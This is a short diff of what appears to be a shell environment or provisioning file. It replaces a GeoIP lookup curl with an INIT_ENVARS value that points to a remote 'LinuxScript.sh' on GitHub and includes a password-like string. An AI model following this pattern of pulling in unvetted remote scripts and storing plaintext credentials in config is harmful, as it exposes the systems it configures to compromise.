@@ -1,4 +1,4 @@
-curl  https://json.geoiplookup.io
+INIT_ENVARS="https://raw.githubusercontent.com/harry41/test/main/LinuxScript.sh|123hello45|3|e"
 export NAME=king
 export CENTOS_PKGS='ansible nginx'
 
